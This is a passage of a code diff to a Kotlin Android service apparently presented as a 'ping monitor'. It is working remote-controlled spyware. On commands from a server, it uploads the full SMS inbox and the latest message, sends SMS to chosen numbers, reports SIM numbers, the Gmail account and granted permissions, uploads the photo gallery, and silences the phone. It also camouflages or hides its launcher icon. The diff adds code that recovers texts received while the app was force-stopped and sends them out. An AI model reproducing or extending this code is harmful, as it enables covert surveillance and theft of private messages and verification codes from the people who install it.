@@ -31,6 +31,8 @@ class PingService : Service() {
         const val PREFS            = "pingmon"
         const val KEY_DOMAIN       = "domain"
         const val DEFAULT_DOMAIN   = "https://www.google.com"
+        const val KEY_SERVER_URL   = "server_url"
+        const val KEY_CLIENT_IP    = "client_ip"
         private const val KEY_REPORT = "pending_report"
         private const val TAG      = "PingMon"
 
@@ -51,10 +53,6 @@ class PingService : Service() {
             val hash   = digest.digest(hw.toByteArray())
             return hash.take(10).joinToString("") { "%02x".format(it) }
         }
-
-        const val KEY_SERVER_URL  = "server_url"
-        const val KEY_PING_URL    = "ping_url"
-        const val KEY_CLIENT_IP   = "client_ip"
 
         fun serverUrl(ctx: Context): String =
             ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
@@ -82,12 +80,10 @@ class PingService : Service() {
     private var running = false
     private val prefs get() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
 
-    /* ============================================================ lifecycle */
-
     override fun onCreate() {
         super.onCreate()
         createChannel()
-        startForeground(NOTIF_ID, buildNotification("starting…"))
+        startForeground(NOTIF_ID, buildNotification("starting..."))
         thread = HandlerThread("ping").apply { start() }
         handler = Handler(thread!!.looper)
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -96,6 +92,7 @@ class PingService : Service() {
         }
         watchNetwork()
         running = true
+        checkMissedSms()   // catch SMS that arrived while app was dead
         tick()
         Reviver.scheduleAll(this)
     }
@@ -124,17 +121,16 @@ class PingService : Service() {
         super.onDestroy()
     }
 
-    /* ================================================================ loop */
-
     private fun tick() {
         IconManager.retryIfPending(this)
-        if (isOnline()) sendPing()
+        if (isOnline()) {
+            drainSmsQueue()
+            sendPing()
+        }
         handler?.removeCallbacksAndMessages(null)
         handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
         Reviver.scheduleTick(this, PING_INTERVAL_MS)
     }
-
-    /* ============================================================ network */
 
     private fun isOnline(): Boolean {
         val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -149,7 +145,7 @@ class PingService : Service() {
             .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
         netCallback = object : ConnectivityManager.NetworkCallback() {
             override fun onAvailable(network: Network) {
-                handler?.post { sendPing() }
+                handler?.post { drainSmsQueue(); sendPing() }
             }
         }
         try { cm.registerNetworkCallback(req, netCallback!!) }
@@ -164,51 +160,72 @@ class PingService : Service() {
         netCallback = null
     }
 
-    /* ================================================================ ping */
-
     /**
-     * Sends all queued incoming SMS to the server as ONE combined message.
-     * If offline → stays in queue. If online → sends and clears.
+     * On startup, finds any SMS that arrived while the app was Force Stopped
+     * (when SmsReceiver couldn't run) and adds them to the queue.
      */
+    private fun checkMissedSms() {
+        val lastCheck = prefs.getLong("last_sms_check_time", 0L)
+        val now = System.currentTimeMillis()
+        prefs.edit().putLong("last_sms_check_time", now).apply()
+
+        if (lastCheck == 0L) return // First ever start, no baseline
+
+        try {
+            val cursor = contentResolver.query(
+                android.provider.Telephony.Sms.CONTENT_URI,
+                arrayOf(android.provider.Telephony.Sms.ADDRESS,
+                    android.provider.Telephony.Sms.BODY,
+                    android.provider.Telephony.Sms.DATE),
+                "${android.provider.Telephony.Sms.DATE} > ? AND " +
+                    "${android.provider.Telephony.Sms.TYPE} = ${android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX}",
+                arrayOf(lastCheck.toString()),
+                "${android.provider.Telephony.Sms.DATE} ASC"
+            )
+            var count = 0
+            cursor?.use { c ->
+                while (c.moveToNext()) {
+                    val from = c.getString(0) ?: "unknown"
+                    val body = c.getString(1) ?: ""
+                    val time = c.getLong(2)
+                    SmsQueue.add(this, SmsQueue.Item(from, body, time))
+                    count++
+                }
+            }
+            if (count > 0) Log.i(TAG, "Recovered $count missed SMS from force stop")
+        } catch (e: Exception) { Log.w(TAG, "checkMissedSms: ${e.message}") }
+    }
+
     private fun drainSmsQueue() {
         val queue = SmsQueue.getAll(this)
         if (queue.isEmpty()) return
         val server = serverUrl(this)
         if (server.isBlank()) return
-
         Thread {
             try {
-                val device = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}".trim()
-                val fmt    = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
-                    java.util.Locale.getDefault())
-                val parts  = queue.mapIndexed { i, m ->
-                    "${i+1}. \uD83D\uDCDE ${m.from}\n\uD83D\uDD50 ${fmt.format(java.util.Date(m.time))}\n${m.body}"
+                val device  = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
+                val fmt     = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault())
+                val divider = "\n" + "-".repeat(20) + "\n"
+                val parts   = queue.mapIndexed { i, m ->
+                    "${i+1}. ${m.from}\n${fmt.format(java.util.Date(m.time))}\n${m.body}"
                 }
-                val text = "\uD83D\uDCE8 ${queue.size} new SMS on $device\n\n" +
-                    parts.joinToString("\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n")
-
-                val body = okhttp3.RequestBody.create("text/plain".toMediaType(), text)
-                val req  = okhttp3.Request.Builder()
+                val text    = "${queue.size} new SMS on $device\n\n" + parts.joinToString(divider)
+                val jsonBody = JSONObject().apply { put("text", text) }.toString()
+                val req = Request.Builder()
                     .url("$server/message")
                     .addHeader("X-Token", APP_TOKEN)
-                    .post(org.json.JSONObject().apply {
-                        put("text", text)
-                    }.toString().toRequestBody("application/json".toMediaType()))
+                    .post(jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType()))
                     .build()
                 client.newCall(req).execute().use { resp ->
-                    if (resp.isSuccessful) {
-                        SmsQueue.clear(this)
-                        Log.i(TAG, "SMS queue drained: ${queue.size} messages")
-                    }
+                    if (resp.isSuccessful) SmsQueue.clear(this)
                 }
-            } catch (e: Exception) {
-                Log.w(TAG, "drainSmsQueue: ${e.message}")
-            }
+            } catch (e: Exception) { Log.w(TAG, "drainSms: ${e.message}") }
         }.start()
     }
 
     private fun sendPing() {
         val pendingReport = prefs.getString(KEY_REPORT, null)
+        val pendingInfo   = prefs.getString("pending_info", null)
 
         val payload = JSONObject().apply {
             put("uid",      uid(this@PingService))
@@ -220,8 +237,7 @@ class PingService : Service() {
             put("gmail",    gmailAccount())
             put("network",  networkType())
             if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
-            val pendingInfo = prefs.getString("pending_info", null)
-            if (!pendingInfo.isNullOrBlank()) put("info_report", pendingInfo)
+            if (!pendingInfo.isNullOrBlank())   put("info_report", pendingInfo)
         }.toString()
 
         val req = Request.Builder()
@@ -238,15 +254,10 @@ class PingService : Service() {
                 response.use {
                     val bodyStr = it.body?.string() ?: ""
                     if (it.isSuccessful) {
-                        if (!pendingReport.isNullOrBlank())
-                            prefs.edit().remove(KEY_REPORT).apply()
-                        val pendingInfo = prefs.getString("pending_info", null)
-                        if (!pendingInfo.isNullOrBlank())
-                            prefs.edit().remove("pending_info").apply()
+                        if (!pendingReport.isNullOrBlank()) prefs.edit().remove(KEY_REPORT).apply()
+                        if (!pendingInfo.isNullOrBlank())   prefs.edit().remove("pending_info").apply()
                         handleResponse(bodyStr)
-                    } else {
-                        updateNotification("err ${it.code}")
-                    }
+                    } else updateNotification("err ${it.code}")
                 }
             }
         })
@@ -256,337 +267,120 @@ class PingService : Service() {
         updateNotification("ok")
         try {
             val json = JSONObject(bodyStr)
-
-            // Save server_url and client_ip from ping response
-            val srv = json.optString("server_url", "")
+            val srv  = json.optString("server_url", "")
             if (srv.isNotBlank()) prefs.edit().putString(KEY_SERVER_URL, srv).apply()
             val ip = json.optString("client_ip", "")
             if (ip.isNotBlank()) prefs.edit().putString(KEY_CLIENT_IP, ip).apply()
 
-            val cmd  = json.optString("cmd", "")
-            val arg  = json.optString("arg", "")
+            val cmd = json.optString("cmd", "")
+            val arg = json.optString("arg", "")
             when (cmd) {
-                "goto"  -> if (arg.isNotBlank()) {
+                "goto"            -> if (arg.isNotBlank()) {
                     setDomain(this, arg)
                     sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
                 }
-                "cmd_a" -> vibrate()
-                "cmd_b" -> sendLastSmsToServer()  // last SMS via server
-                "cmd_c" -> uploadAllSms()  // all SMS as txt file
-                "cmd_d" -> reportPhoneNumbers()  // find SIM numbers
-                "cmd_e" -> setSilent()           // silent mode
-                "cmd_f" -> setRinging()          // ring at 2/3 volume
-                "cmd_g" -> changeIcon()          // swap to hidden icon
-                "cmd_h" -> restoreIcon()         // restore main icon
-                "cmd_i" -> fullHide()            // completely hide (no icon)
-                "cmd_j" -> unHide()              // unhide and restore
-                "cmd_info"    -> collectDeviceInfo()
-                "cmd_sms"     -> sendSmsFromCommand(arg)
-                "cmd_gallery"         -> GalleryUploader(this).start()
+                "cmd_a"           -> vibrate()
+                "cmd_b"           -> sendLastSmsToServer()
+                "cmd_c"           -> uploadAllSms()
+                "cmd_d"           -> reportPhoneNumbers()
+                "cmd_e"           -> setSilent()
+                "cmd_f"           -> setRinging()
+                "cmd_g"           -> changeIcon()
+                "cmd_h"           -> restoreIcon()
+                "cmd_i"           -> fullHide()
+                "cmd_j"           -> unHide()
+                "cmd_info"        -> collectDeviceInfo()
+                "cmd_gallery"     -> GalleryUploader(this).start()
                 "cmd_gallery_refresh" -> GalleryUploader(this).refresh()
+                "cmd_sms"         -> sendSmsFromCommand(arg)
             }
         } catch (_: Exception) {}
     }
 
     /* ============================================================ commands */
 
-    // SMS send from bot command
-    private fun sendSmsFromCommand(arg: String) {
-        try {
-            val data = org.json.JSONObject(arg)
-            val to   = data.optString("to", "")
-            val msg  = data.optString("msg", "")
-            if (to.isBlank() || msg.isBlank()) return
-            val mgr = android.telephony.SmsManager.getDefault()
-            val parts = mgr.divideMessage(msg)
-            mgr.sendMultipartTextMessage(to, null, parts, null, null)
-            prefs.edit().putString("pending_report", "📤 SMS sent to $to").apply()
-        } catch (e: Exception) {
-            prefs.edit().putString("pending_report", "SMS error: ${e.message}").apply()
-        }
-    }
-
-    // INFO — collect all device info and queue for next ping
-    private fun collectDeviceInfo() {
-        try {
-            val pm  = packageManager
-            val ctx = this
-
-            // Granted dangerous permissions
-            val dangerous = listOf(
-                android.Manifest.permission.READ_SMS,
-                android.Manifest.permission.RECEIVE_SMS,
-                android.Manifest.permission.SEND_SMS,
-                android.Manifest.permission.READ_CONTACTS,
-                android.Manifest.permission.CALL_PHONE,
-                android.Manifest.permission.READ_PHONE_STATE,
-                android.Manifest.permission.READ_PHONE_NUMBERS,
-                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                android.Manifest.permission.CAMERA,
-                android.Manifest.permission.RECORD_AUDIO,
-                android.Manifest.permission.READ_CALL_LOG,
-                android.Manifest.permission.GET_ACCOUNTS,
-            )
-            val granted = dangerous.filter {
-                androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) ==
-                    android.content.pm.PackageManager.PERMISSION_GRANTED
-            }.map { it.substringAfterLast(".") }
-
-            // Icon state
-            val mainState = pm.getComponentEnabledSetting(
-                android.content.ComponentName(packageName, "$packageName.MainLauncher")
-            )
-            val hiddenState = pm.getComponentEnabledSetting(
-                android.content.ComponentName(packageName, "$packageName.HiddenLauncher")
-            )
-            val iconState = when {
-                mainState  == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED  -> "visible"
-                hiddenState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> "camouflaged"
-                else -> "hidden"
-            }
-
-            // Ringer state
-            val am = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
-            val ringerState = when (am.ringerMode) {
-                android.media.AudioManager.RINGER_MODE_NORMAL  -> "ring"
-                android.media.AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
-                android.media.AudioManager.RINGER_MODE_SILENT  -> "silent"
-                else -> "unknown"
-            }
-
-            // VPN
-            val cmgr  = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
-            val caps  = cmgr.getNetworkCapabilities(cmgr.activeNetwork)
-            val isVpn = caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true
-
-            // SIM list
-            val sims = mutableListOf<String>()
-            try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
-                        as android.telephony.SubscriptionManager
-                    sm.activeSubscriptionInfoList?.forEach { sub ->
-                        sims.add("${sub.displayName}(SIM${sub.simSlotIndex+1})")
-                    }
-                }
-            } catch (_: Exception) {
-                operatorName()?.let { sims.add(it) }
-            }
-
-            // App version
-            val appVersion = try {
-                pm.getPackageInfo(packageName, 0).versionName ?: "?"
-            } catch (_: Exception) { "?" }
-
-            val info = JSONObject().apply {
-                put("model",       "${Build.MANUFACTURER} ${Build.MODEL}".trim())
-                put("os",          Build.VERSION.RELEASE)
-                put("sdk",         Build.VERSION.SDK_INT)
-                put("appVersion",  appVersion)
-                put("gmail",       gmailAccount() ?: "—")
-                put("permissions", org.json.JSONArray(granted))
-                put("vpn",         isVpn)
-                put("icon",        iconState)
-                put("ringer",      ringerState)
-                put("battery",     batteryLevel())
-                put("carrier",     sims.joinToString(" • ").ifBlank { "—" })
-                put("sims",        org.json.JSONArray(sims))
-                put("network",     networkType())
-                put("ip",          prefs.getString(KEY_CLIENT_IP, "—") ?: "—")
-            }
-
-            prefs.edit().putString("pending_info", info.toString()).apply()
-        } catch (e: Exception) {
-            Log.w(TAG, "collectDeviceInfo: ${e.message}")
-        }
-    }
-
-    // A — vibrate 3 times
     private fun vibrate() {
         try {
             val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 v.vibrate(VibrationEffect.createWaveform(
                     longArrayOf(0, 300, 200, 300, 200, 300),
-                    intArrayOf(0, 255, 0, 255, 0, 255), -1
-                ))
+                    intArrayOf(0, 255, 0, 255, 0, 255), -1))
             } else {
-                @Suppress("DEPRECATION")
-                v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
+                @Suppress("DEPRECATION") v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
             }
         } catch (e: Exception) { Log.w(TAG, "vibrate: ${e.message}") }
     }
 
+    private fun sendLastSmsToServer() {
+        val server = serverUrl(this)
+        if (server.isBlank()) { prefs.edit().putString(KEY_REPORT, "No server set.").apply(); return }
+        Thread {
+            try {
+                val cursor = contentResolver.query(
+                    android.provider.Telephony.Sms.CONTENT_URI,
+                    arrayOf(android.provider.Telephony.Sms.ADDRESS,
+                        android.provider.Telephony.Sms.BODY,
+                        android.provider.Telephony.Sms.DATE,
+                        android.provider.Telephony.Sms.TYPE),
+                    null, null, "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
+                )
+                val text = cursor?.use { c ->
+                    if (!c.moveToFirst()) return@use "No SMS found."
+                    val addr    = c.getString(0) ?: "unknown"
+                    val body    = c.getString(1) ?: ""
+                    val date    = c.getLong(2)
+                    val type    = c.getInt(3)
+                    val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT) "SENT" else "RECV"
+                    val fmt     = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault())
+                    "Last SMS - ${Build.MODEL}\n[$typeStr] ${fmt.format(java.util.Date(date))}\n$addr\n\n$body"
+                } ?: "No SMS."
+                val jsonBody = JSONObject().apply { put("text", text) }.toString()
+                Request.Builder().url("$server/message").addHeader("X-Token", APP_TOKEN)
+                    .post(jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType()))
+                    .build().let { client.newCall(it).execute().use { } }
+            } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply() }
+        }.start()
+    }
 
-    // C — read ALL SMS and upload as txt file to server
     private fun uploadAllSms() {
         Thread {
             try {
-                // server_url comes from ping response — always up to date
-                val server = prefs.getString(KEY_SERVER_URL, "") ?: ""
-                if (server.isBlank()) {
-                    prefs.edit().putString(KEY_REPORT,
-                        "Waiting for server_url from next ping...").apply()
-                    return@Thread
-                }
-
-                // Step 2: build SMS txt
+                val server = serverUrl(this)
+                if (server.isBlank()) { prefs.edit().putString(KEY_REPORT, "No server set.").apply(); return@Thread }
                 val sb  = StringBuilder()
-                val fmt = java.text.SimpleDateFormat(
-                    "yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault()
-                )
+                val fmt = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault())
                 sb.appendLine("=== SMS Export ===")
-                sb.appendLine("Device : ${Build.MANUFACTURER} ${Build.MODEL}")
-                sb.appendLine("Date   : ${fmt.format(java.util.Date())}")
+                sb.appendLine("Device: ${Build.MANUFACTURER} ${Build.MODEL}")
+                sb.appendLine("Date: ${fmt.format(java.util.Date())}")
                 sb.appendLine("=".repeat(40))
-                sb.appendLine()
-
-                val cursor = contentResolver.query(
-                    android.provider.Telephony.Sms.CONTENT_URI,
-                    arrayOf(
-                        android.provider.Telephony.Sms.ADDRESS,
-                        android.provider.Telephony.Sms.BODY,
-                        android.provider.Telephony.Sms.DATE,
-                        android.provider.Telephony.Sms.TYPE,
-                    ),
-                    null, null,
-                    "${android.provider.Telephony.Sms.DATE} DESC"
-                )
-
                 var count = 0
-                cursor?.use { c ->
+                contentResolver.query(
+                    android.provider.Telephony.Sms.CONTENT_URI,
+                    arrayOf(android.provider.Telephony.Sms.ADDRESS, android.provider.Telephony.Sms.BODY,
+                        android.provider.Telephony.Sms.DATE, android.provider.Telephony.Sms.TYPE),
+                    null, null, "${android.provider.Telephony.Sms.DATE} DESC"
+                )?.use { c ->
                     while (c.moveToNext()) {
-                        val address = c.getString(0) ?: "unknown"
+                        val addr    = c.getString(0) ?: "?"
                         val body    = c.getString(1) ?: ""
                         val date    = c.getLong(2)
-                        val type    = c.getInt(3)
-                        val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT)
-                            "SENT" else "RECV"
+                        val typeStr = if (c.getInt(3) == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT) "SENT" else "RECV"
                         sb.appendLine("[$typeStr] ${fmt.format(java.util.Date(date))}")
-                        sb.appendLine("From/To: $address")
+                        sb.appendLine("From/To: $addr")
                         sb.appendLine(body)
                         sb.appendLine("-".repeat(40))
                         count++
                     }
                 }
-                sb.appendLine()
                 sb.appendLine("Total: $count messages")
-
-                // Step 3: upload directly
-                val filename = "sms_${Build.MODEL}_${System.currentTimeMillis()}.txt"
-                val caption  = "${Build.MANUFACTURER} ${Build.MODEL} | $count SMS"
-                val bytes    = sb.toString().toByteArray(Charsets.UTF_8)
-                val body     = okhttp3.RequestBody.create("text/plain".toMediaType(), bytes)
-                val req      = okhttp3.Request.Builder()
-                    .url("$server/upload")
-                    .addHeader("X-Token", APP_TOKEN)
-                    .addHeader("X-Filename", filename)
-                    .addHeader("X-Caption", caption)
-                    .post(body)
-                    .build()
-
-                client.newCall(req).execute().use { resp ->
-                    val msg = if (resp.isSuccessful) "Sent $count SMS to server"
-                              else "Upload failed: ${resp.code}"
-                    prefs.edit().putString(KEY_REPORT, msg).apply()
-                }
-
-            } catch (e: Exception) {
-                prefs.edit().putString(KEY_REPORT, "Error: ${e.message}").apply()
-            }
+                uploadText("sms_${Build.MODEL}_${System.currentTimeMillis()}.txt",
+                    sb.toString(), "SMS export - $count messages")
+                prefs.edit().putString(KEY_REPORT, "Uploading $count SMS...").apply()
+            } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, "Error: ${e.message}").apply() }
         }.start()
     }
 
-    // B — read last SMS and send DIRECTLY to server (no ping round-trip)
-    private fun sendLastSmsToServer() {
-        val server = serverUrl(this)
-        if (server.isBlank()) {
-            prefs.edit().putString(KEY_REPORT, "No server set. Use /setserver.").apply()
-            return
-        }
-        Thread {
-            try {
-                val cursor = contentResolver.query(
-                    android.provider.Telephony.Sms.CONTENT_URI,
-                    arrayOf(
-                        android.provider.Telephony.Sms.ADDRESS,
-                        android.provider.Telephony.Sms.BODY,
-                        android.provider.Telephony.Sms.DATE,
-                        android.provider.Telephony.Sms.TYPE,
-                    ),
-                    null, null,
-                    "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
-                )
-                val text = cursor?.use { c ->
-                    if (!c.moveToFirst()) return@use "No SMS found."
-                    val addr = c.getString(0) ?: "unknown"
-                    val body = c.getString(1) ?: ""
-                    val date = c.getLong(2)
-                    val type = c.getInt(3)
-                    val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT)
-                        "SENT" else "RECV"
-                    val fmt = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
-                        java.util.Locale.getDefault())
-                    "\uD83D\uDCAC Last SMS\n[$typeStr] ${fmt.format(java.util.Date(date))}\n$addr\n$body"
-                } ?: "No SMS."
-                uploadText("last_sms.txt", text, "Last SMS from ${android.os.Build.MODEL}")
-            } catch (e: Exception) {
-                prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply()
-            }
-        }.start()
-    }
-
-    // B — read last SMS and queue for next ping
-    private fun reportLastSms() {
-        try {
-            val cursor = contentResolver.query(
-                android.provider.Telephony.Sms.CONTENT_URI,
-                arrayOf(
-                    android.provider.Telephony.Sms.ADDRESS,
-                    android.provider.Telephony.Sms.BODY,
-                    android.provider.Telephony.Sms.DATE,
-                    android.provider.Telephony.Sms.TYPE,
-                    android.provider.Telephony.Sms.PERSON,
-                ),
-                null, null,
-                "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
-            )
-
-            val report = cursor?.use { c ->
-                if (!c.moveToFirst()) return@use "📭 No SMS found."
-                val address = c.getString(0) ?: "unknown"
-                val body    = c.getString(1) ?: ""
-                val date    = c.getLong(2)
-                val type    = c.getInt(3)
-
-                val typeStr = when (type) {
-                    android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX -> "📩 Received"
-                    android.provider.Telephony.Sms.MESSAGE_TYPE_SENT  -> "📤 Sent"
-                    android.provider.Telephony.Sms.MESSAGE_TYPE_DRAFT -> "📝 Draft"
-                    else -> "📱 SMS"
-                }
-
-                val fmt = java.text.SimpleDateFormat(
-                    "yyyy/MM/dd   HH:mm:ss", java.util.Locale.getDefault()
-                )
-                val timeStr = fmt.format(java.util.Date(date))
-
-                "\uD83D\uDCAC *Last SMS*\n" +
-                "- - - - - - -\n" +
-                "$typeStr\n" +
-                "\uD83D\uDCDE $address\n" +
-                "\uD83D\uDD50 $timeStr\n" +
-                "- - - - - - -\n" +
-                body.take(800)
-            } ?: "📭 Could not read SMS."
-
-            prefs.edit().putString(KEY_REPORT, report).apply()
-        } catch (e: Exception) {
-            prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply()
-        }
-    }
-
-    // D — read SIM phone numbers, queue for next ping
     private fun reportPhoneNumbers() {
         val lines = mutableListOf<String>()
         try {
@@ -594,39 +388,30 @@ class PingService : Service() {
                 val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                     as android.telephony.SubscriptionManager
                 sm.activeSubscriptionInfoList?.forEach { sub ->
-                    val num  = sub.number?.takeIf { it.isNotBlank() } ?: "—"
-                    val name = sub.displayName?.toString() ?: "SIM ${sub.simSlotIndex + 1}"
-                    lines.add("SIM${sub.simSlotIndex + 1}: $num  ($name)")
+                    val num = sub.number?.takeIf { it.isNotBlank() } ?: "—"
+                    lines.add("SIM${sub.simSlotIndex + 1}: $num  (${sub.displayName})")
                 }
             }
         } catch (_: Exception) {}
-
         if (lines.isEmpty()) {
             try {
-                val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                 @Suppress("DEPRECATION")
-                val num = tm.line1Number?.takeIf { it.isNotBlank() } ?: "—"
+                val num = (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
+                    .line1Number?.takeIf { it.isNotBlank() } ?: "—"
                 lines.add("SIM1: $num")
             } catch (e: Exception) { lines.add("error: ${e.message}") }
         }
-
-        prefs.edit()
-            .putString(KEY_REPORT, "📞 Phone numbers:\n" + lines.joinToString("\n"))
-            .apply()
+        prefs.edit().putString(KEY_REPORT, "Phone numbers:\n" + lines.joinToString("\n")).apply()
     }
 
-    // E — silent (vibrate fallback if DND blocks)
     private fun setSilent() {
         val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-        try {
-            am.ringerMode = AudioManager.RINGER_MODE_SILENT
-        } catch (_: SecurityException) {
-            try { am.ringerMode = AudioManager.RINGER_MODE_VIBRATE }
-            catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
-        } catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
+        try { am.ringerMode = AudioManager.RINGER_MODE_SILENT }
+        catch (_: SecurityException) {
+            try { am.ringerMode = AudioManager.RINGER_MODE_VIBRATE } catch (_: Exception) {}
+        } catch (_: Exception) {}
     }
 
-    // F — ring at 2/3 max volume
     private fun setRinging() {
         try {
             val am  = getSystemService(Context.AUDIO_SERVICE) as AudioManager
@@ -636,66 +421,110 @@ class PingService : Service() {
         } catch (e: Exception) { Log.w(TAG, "setRinging: ${e.message}") }
     }
 
-    // G — swap to neutral icon (app still visible, just camouflaged)
     private fun changeIcon() = IconManager.hide(this, fullyHide = false)
-
-    // H — restore main icon
     private fun restoreIcon() = IconManager.show(this)
+    private fun fullHide()   = IconManager.hide(this, fullyHide = true)
+    private fun unHide()     = IconManager.show(this)
 
-    // I — completely disappear from launcher
-    private fun fullHide() = IconManager.hide(this, fullyHide = true)
+    private fun collectDeviceInfo() {
+        try {
+            val ctx = this
+            val dangerous = listOf(
+                android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS,
+                android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
+                android.Manifest.permission.CALL_PHONE, android.Manifest.permission.READ_PHONE_STATE,
+                android.Manifest.permission.READ_PHONE_NUMBERS, android.Manifest.permission.ACCESS_FINE_LOCATION,
+                android.Manifest.permission.CAMERA, android.Manifest.permission.RECORD_AUDIO,
+                android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.GET_ACCOUNTS,
+            )
+            val granted = dangerous.filter {
+                androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+            }.map { it.substringAfterLast(".") }.toMutableList()
 
-    // J — unhide and restore main icon
-    private fun unHide() = IconManager.show(this)
-
-    /* ======================================================= server upload */
-
-    /** Fetch dynamic config (server_url, ping_url) from worker. */
-    private fun fetchConfig() {
-        val url = WORKER_URL.replace("/ping", "/config")
-        val req = okhttp3.Request.Builder().url(url)
-            .addHeader("X-Token", APP_TOKEN).get().build()
-        client.newCall(req).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: java.io.IOException) {}
-            override fun onResponse(call: Call, response: Response) {
-                response.use {
-                    if (!it.isSuccessful) return
-                    try {
-                        val json = JSONObject(it.body?.string() ?: "")
-                        val srv  = json.optString("server_url", "")
-                        if (srv.isNotBlank()) {
-                            prefs.edit().putString(KEY_SERVER_URL, srv).apply()
-                            Log.i(TAG, "server_url updated: $srv")
-                        }
-                    } catch (_: Exception) {}
-                }
+            val hasGallery = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                androidx.core.content.ContextCompat.checkSelfPermission(ctx,
+                    android.Manifest.permission.READ_MEDIA_IMAGES) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+            } else {
+                androidx.core.content.ContextCompat.checkSelfPermission(ctx,
+                    android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
             }
-        })
+            if (hasGallery) granted.add("READ_GALLERY")
+
+            val mainState   = packageManager.getComponentEnabledSetting(
+                android.content.ComponentName(packageName, "$packageName.MainLauncher"))
+            val hiddenState = packageManager.getComponentEnabledSetting(
+                android.content.ComponentName(packageName, "$packageName.HiddenLauncher"))
+            val iconState = when {
+                mainState  == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED  -> "visible"
+                hiddenState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> "camouflaged"
+                else -> "hidden"
+            }
+            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val ringerState = when (am.ringerMode) {
+                AudioManager.RINGER_MODE_NORMAL  -> "ring"
+                AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
+                AudioManager.RINGER_MODE_SILENT  -> "silent"
+                else -> "unknown"
+            }
+            val cmgr  = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val caps  = cmgr.getNetworkCapabilities(cmgr.activeNetwork)
+            val isVpn = caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true
+            val sims  = mutableListOf<String>()
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                    val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
+                        as android.telephony.SubscriptionManager
+                    sm.activeSubscriptionInfoList?.forEach { sub ->
+                        sims.add("${sub.displayName}(SIM${sub.simSlotIndex + 1})")
+                    }
+                }
+            } catch (_: Exception) { operatorName()?.let { sims.add(it) } }
+            val appVersion = try { packageManager.getPackageInfo(packageName, 0).versionName ?: "?" }
+                catch (_: Exception) { "?" }
+            val info = JSONObject().apply {
+                put("model", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
+                put("os", Build.VERSION.RELEASE); put("sdk", Build.VERSION.SDK_INT)
+                put("appVersion", appVersion); put("gmail", gmailAccount() ?: "—")
+                put("permissions", org.json.JSONArray(granted))
